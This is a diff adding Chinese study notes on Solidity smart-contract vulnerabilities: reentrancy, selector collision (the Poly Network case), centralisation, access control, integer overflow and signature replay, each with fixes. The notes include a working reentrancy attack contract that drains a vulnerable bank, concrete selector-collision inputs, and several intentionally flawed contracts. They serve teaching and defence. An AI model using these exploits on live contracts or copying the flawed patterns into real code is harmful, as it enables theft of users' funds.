@@ -2699,14 +2699,229 @@ import '@openzeppelin/contracts/access/Ownable.sol';
 ### 2024.10.12
 
 - [104-S01] 重入攻击
-- [104-S02] 选择器碰撞
-- [104-S03] 中心化风险
+    - 攻击者通过合约漏洞（例如 fallback 函数）循环调用合约，将合约中资产转走或铸造大量代币。漏洞例子：
+    ```solidity
+    contract Bank {
+        mapping (address => uint256) public balanceOf;
+        function deposit() external payable {
+            balanceOf[msg.sender] += msg.value;
+        }
+        function withdraw() external {
+            uint256 balance = balanceOf[msg.sender];
+            require(balance > 0, "Insufficient balance");
 
+            (bool success, ) = msg.sender.call{value: balance}(""); // 漏洞代码
+            require(success, "Failed to send Ether");
+            balanceOf[msg.sender] = 0;
+        }
+
+        function getBalance() external view returns (uint256) {
+            return address(this).balance;
+        }
+    }
+    ```
+    - EXP：
+    ```solidity
+    contract Attack {
+        Bank public bank;
+        constructor(Bank _bank) {
+            bank = _bank;
+        }
+
+        receive() external payable {
+            if (bank.getBalance() >= 1 ether) {
+                bank.withdraw();
+            }
+        }
+
+        function attack() external payable {
+            require(msg.value == 1 ether, "Require 1 Ether to attack");
+            bank.deposit{value: 1 ether}();
+            bank.withdraw();
+        }
+
+        function getBalance() external view returns (uint256) {
+            return address(this).balance;
+        }
+    }
+    ```
+    - 防范方案：Check-Effect-Interaction 设计原则(检查-影响-交互模式)：编写函数时，要先检查状态变量是否符合要求，紧接着更新状态变量（例如余额），最后再和别的合约交互。将Bank合约withdraw()函数中的更新余额提前到转账ETH之前即可：
+    ```solidity
+    function withdraw() external {
+        uint256 balance = balanceOf[msg.sender];
+        require(balance > 0, "Insufficient balance");
+        balanceOf[msg.sender] = 0;
+        (bool success, ) = msg.sender.call{value: balance}("");
+        require(success, "Failed to send Ether");
+    }
+    ```
+    - 重入锁:一种防止重入函数的修饰器（modifier），它包含一个默认为0的状态变量_status。被nonReentrant重入锁修饰的函数，在第一次调用时会检查_status是否为0，紧接着将_status的值改为1，调用结束后才会再改为0。这样，当攻击合约在调用结束前第二次的调用就会报错，重入攻击失败。
+    ```solidity
+    uint256 private _status;
+    modifier nonReentrant() {
+        require(_status == 0, "ReentrancyGuard: reentrant call");
+        _status = 1;
+        _;
+        _status = 0;
+    }
+
+    function withdraw() external nonReentrant{
+        uint256 balance = balanceOf[msg.sender];
+        require(balance > 0, "Insufficient balance");
+
+        (bool success, ) = msg.sender.call{value: balance}("");
+        require(success, "Failed to send Ether");
+
+        balanceOf[msg.sender] = 0;
+    }
+    ```
+    - OpenZeppelin 也提倡遵循 PullPayment(拉取支付)模式以避免潜在的重入攻击。其原理是通过引入第三方(escrow)，将原先的“主动转账”分解为“转账者发起转账”加上“接受者主动拉取”。当想要发起一笔转账时，会通过_asyncTransfer(address dest, uint256 amount)将待转账金额存储到第三方合约中，从而避免因重入导致的自身资产损失。而当接受者想要接受转账时，需要主动调用withdrawPayments(address payable payee)进行资产的主动获取。
+- [104-S02] 选择器碰撞 [case: poly network](https://rekt.news/zh/polynetwork-rekt/)
+    - 当用户调用合约的函数时，calldata的前4字节就是目标函数的选择器。下面这俩网站可以查选择器对应的不同函数:
+        - https://www.4byte.directory/
+        - https://sig.eth.samczsun.com/
+    - 或者使用 PowerClash: https://github.com/AmazingAng/power-clash 暴力破解【因为只有4字节】；
+    - 漏洞例子：
+    ```solidity
+    contract SelectorClash {
+    bool public solved; // 攻击是否成功
+        function putCurEpochConPubKeyBytes(bytes memory _bytes) public { // 攻击者需要调用这个函数，但是调用者 msg.sender 必须是本合约。
+            require(msg.sender == address(this), "Not Owner");
+            solved = true;
+        }
+        // 有漏洞，攻击者可以通过改变 _method 变量碰撞函数选择器，调用目标函数并完成攻击。
+        function executeCrossChainTx(bytes memory _method, bytes memory _bytes, bytes memory _bytes1, uint64 _num) public returns(bool success){
+            (success, ) = address(this).call(abi.encodePacked(bytes4(keccak256(abi.encodePacked(_method, "(bytes,bytes,uint64)"))), abi.encode(_bytes, _bytes1, _num)));
+        }
+    }
+    ```
+    - 目标是利用executeCrossChainTx()函数调用合约中的putCurEpochConPubKeyBytes()，目标函数的选择器为：0x41973cd9。观察到executeCrossChainTx()中是利用_method参数和"(bytes,bytes,uint64)"作为函数签名计算的选择器。因此，我们只需要选择恰当的_method，让这里算出的选择器等于0x41973cd9，通过选择器碰撞调用目标函数。Poly Network黑客事件中，黑客碰撞出的_method为 f1121318093，即f1121318093(bytes,bytes,uint64)的哈希前4位也是0x41973cd9，可以成功的调用函数。接下来我们要做的就是将f1121318093转换为bytes类型：0x6631313231333138303933，然后作为参数输入到executeCrossChainTx()中。executeCrossChainTx()函数另3个参数不重要，填 0x, 0x, 0 就可以。
+- [104-S03] 中心化风险
+    - 中心化风险是 DeFi 中最常见的漏洞。中心化风险指智能合约的所有权是中心化的，例如合约的owner由一个地址控制，它可以随意修改合约参数，甚至提取用户资金。中心化的项目存在单点风险，可以被恶意开发者（内鬼）或黑客利用，只需要获取具有控制权限地址的私钥之后，就可以通过rug-pull，无限铸币，或其他类型方法盗取资金。
+    - 伪去中心化的项目通常对外鼓吹自己是去中心化的，但实际上和中心化项目一样存在单点风险。比如使用多签钱包来管理智能合约，但几个多签人是一致行动人，背后由一个人控制。解决方案：
+        - 使用多签钱包管理国库和控制合约参数。为了兼顾效率和去中心化，可以选择 4/7 或 6/9 多签。
+        - 多签的持有人要多样化，分散在创始团队、投资人、社区领袖之间，并且不要相互授权签名。
+        - 使用时间锁控制合约，在黑客或项目内鬼修改合约参数/盗取资产时，项目方和社区有一些时间来应对，将损失最小化。
 ### 2024.10.13
 
 - [104-S04] 权限管理漏洞
-- [104-S05] 整型溢出
-- [104-S06] 签名重放
+    - 智能合约中的权限管理定义了不同角色在应用中的权限。通常来说，代币的铸造、提取资金、暂停等功能都需要较高权限的用户才能调用。如果权限配置错误，就可能造成意想不到的损失。两种常见的权限管理漏洞。
+        - 1. 权限配置错误: 如果合约中特殊功能没有加上权限管理，那么任何人都能铸造大量代币或将合约中的资金提光。
+        ```solidity
+        function badMint(address to, uint amount) public { // 错误的mint函数，没有限制权限
+            _mint(to, amount);
+        }
+        ```
+        - 2. 授权检查错误: 没有在函数中检查调用者是否拥有足够的授权
+        ```solidity
+        function badBurn(address account, uint amount) public { // 错误的burn函数，没有限制权限
+            _burn(account, amount);
+        }
+        ```
+    - 预防方法：
+        - 使用 Openzeppelin 的权限管理库给合约的特殊函数配置相应的权限：比如使用OnlyOwner修饰器
+        ```solidity
+        function goodMint(address to, uint amount) public onlyOwner { // 正确的mint函数，使用 onlyOwner 修饰器限制权限
+            _mint(to, amount); 
+        }
+        ```
+        - 在函数的逻辑中确保合约调用者拥有足够的授权
+        ```solidity
+        function goodBurn(address account, uint amount) public {
+            if(msg.sender != account){ // 正确的burn函数，如果销毁的不是自己的代币，则会检查授权
+                _spendAllowance(account, msg.sender, amount);
+            }
+            _burn(account, amount);
+        }
+        ```
+- [104-S05] 整型溢出(Arithmetic Over/Under Flows),这是一个比较经典的漏洞，Solidity 0.8 版本后内置了 Safemath 库，因此很少发生。
+    - 以太坊虚拟机（EVM）为整型设置了固定大小，因此它只能表示特定范围的数字。例如 uint8，只能表示 [0,255] 范围内的数字。如果给 uint8 类型变量的赋值 257，则会上溢（overflow）变为 1；如果给它赋值-1，则会下溢（underflow）变为255。
+    - 漏洞例子：
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.21;
+
+    contract Token {
+        mapping(address => uint) balances;
+        uint public totalSupply;
+
+        constructor(uint _initialSupply) {
+            balances[msg.sender] = totalSupply = _initialSupply;
+        }
+        
+        function transfer(address _to, uint _value) public returns (bool) {
+            unchecked{ // unchecked 关键字在代码块中临时关闭整型溢出检测
+                require(balances[msg.sender] - _value >= 0);
+                balances[msg.sender] -= _value; // 转太多会出错
+                balances[_to] += _value;
+            }
+            return true;
+        }
+        function balanceOf(address _owner) public view returns (uint balance) {
+            return balances[_owner];
+        }
+    }
+    ```
+- [104-S06] 签名重放（Signature Replay）
+    - 数字签名一般有两种常见的重放攻击：
+        - 普通重放：将本该使用一次的签名多次使用。
+        - 跨链重放：将本该在一条链上使用的签名，在另一条链上重复使用。
+    - 漏洞例子：
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.21;
+
+    import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+    import "@openzeppelin/contracts/access/Ownable.sol";
+    import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
+
+    contract SigReplay is ERC20 {
+        address public signer;
+        constructor() ERC20("SigReplay", "Replay") {
+            signer = msg.sender;
+        }
+
+        function badMint(address to, uint amount, bytes memory signature) public { // 有签名重放漏洞的铸造函数
+            bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));
+            require(verify(_msgHash, signature), "Invalid Signer!"); // 铸造函数 badMint() 没有对 signature 查重，导致同样的签名可以多次使用，无限铸造代币
+            _mint(to, amount);
+        }
+
+        function getMessageHash(address to, uint256 amount) public pure returns(bytes32){
+            return keccak256(abi.encodePacked(to, amount));
+        }
+
+        function toEthSignedMessageHash(bytes32 hash) public pure returns (bytes32) {
+            return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", hash));
+        }
+
+        function verify(bytes32 _msgHash, bytes memory _signature) public view returns (bool){
+            return ECDSA.recover(_msgHash, _signature) == signer;
+        }
+    }
+    ```
+    - 预防办法：
+    ```solidity
+    // 方法一
+    mapping(address => bool) public mintedAddress;   // 记录已经mint的地址
+
+    function goodMint(address to, uint amount, bytes memory signature) public {
+        bytes32 _msgHash = toEthSignedMessageHash(getMessageHash(to, amount));
+        require(verify(_msgHash, signature), "Invalid Signer!");
+        require(!mintedAddress[to], "Already minted"); // 检查该地址是否mint过
+        mintedAddress[to] = true; // 记录mint过的地址
+        _mint(to, amount);
+    }
+    // 方法二：将 nonce （数值随每次交易递增）和 chainid （链ID）包含在签名消息中
+    uint nonce;
+
+    function nonceMint(address to, uint amount, bytes memory signature) public {
+        bytes32 _msgHash = toEthSignedMessageHash(keccak256(abi.encodePacked(to, amount, nonce, block.chainid)));
+        require(verify(_msgHash, signature), "Invalid Signer!");
+        _mint(to, amount);
+        nonce++;
+    }
+    ```
 
 ### 2024.10.14
 
